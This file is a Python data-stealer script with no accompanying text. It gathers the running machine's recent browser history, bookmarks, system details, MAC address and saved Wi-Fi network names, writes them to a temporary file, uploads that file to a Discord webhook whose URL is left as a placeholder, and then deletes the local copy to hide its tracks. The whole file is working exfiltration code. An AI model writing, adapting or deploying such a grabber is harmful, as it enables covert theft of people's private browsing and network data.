from discord_webhook import DiscordWebhook
from getmac import get_mac_address as mac
from browser_history import get_bookmarks
from browser_history import get_history
from subprocess import check_output
from threading import Thread
import platform
import pytz
import os

url = 'DISCORD WEBHOOK URL'


def retrieve_history(length=50):
    history = get_history().histories
    history_final = []
    for i in range(length):
        item = history[len(history)-1-i]
        history_final.append([item[0].astimezone(pytz.timezone('US/Pacific')).strftime('%Y/%m/%d %I:%M:%S'), item[1]])
    data['search_history'] = history_final

def retrieve_bookmarks():
    bookmarks = get_bookmarks().bookmarks
    marks = []
    for bookmark in bookmarks:
        marks.append([bookmark[1], bookmark[2], bookmark[3].replace('bookmark_bar', '')])
    data['bookmarks'] = marks

def retrieve_system_info():
    op = platform.uname()
    data['system_info'] = {
        'OS': op.system,
        'Name': op.node,
        'Release': op.release,
        'Machine': op.machine,
        'Processor': op.processor
    }

def retrieve_saved_networks():
    unparsed_data = check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace")
    unparsed_data = unparsed_data.split('\n')
    networks = []
    for d in unparsed_data:
        if 'All User Profile' in d:
            networks.append(d.split(':')[1].replace('\r', '')[1:])
    data['networks'] = networks

    
data = {}

Thread(target=retrieve_bookmarks).start()
Thread(target=retrieve_saved_networks).start()
Thread(target=retrieve_system_info).start()
data['mac_address'] = mac()
# does not work inside a thread
retrieve_history()

# checks if processes have finished
while True:
    try:
        data['search_history']
        break
    except KeyError:
        pass

formatted = []
for item in data['search_history']:
    formatted.append(str(item))

with open('raw_data_dump.txt', 'w') as file:
    file.write(f'''
System Information
{data['system_info']}
       
MAC
{data['mac_address']}
    
Networks
{data['networks']}
    
Bookmarks
{data['bookmarks']}
    
Search History
'''+'\n'.join(formatted))


webhook = DiscordWebhook(url=url)
with open('raw_data_dump.txt', 'rb') as file:
    webhook.add_file(file=file.read(), filename='data.txt')
webhook.execute()
os.remove('raw_data_dump.txt')
